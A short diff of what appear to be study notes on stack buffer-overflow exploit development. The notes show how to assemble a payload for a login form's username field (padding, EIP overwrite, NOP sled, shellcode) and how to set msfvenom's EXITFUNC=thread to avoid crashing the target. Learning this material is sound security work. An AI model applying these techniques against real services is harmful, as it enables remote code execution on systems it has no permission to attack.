@@ -176,7 +176,7 @@ content = b"username=" + pre_buffer + eip + post_buffer + shellcode + b"&passwor
 	- NOP Sled: `nops = b'x\90' *10*`
 	- `content = b"username=" + pre_buffer + eip + post_buffer + nop_sled + shellcode + b"&password=A"`
 - **Preventing Process Crash**
-- By default msfvenom will use `ExitProcess` on termination, crashing the process, but we can specify `ExitThread` instead.
+- By default msfvenom will use `ExitProcess` on termination, crashing the process, but we can specify `ExitThread` instead in payload generation.
 	- `msfvenom ...  EXITFUNC=thread ...`
 
 ### Fin
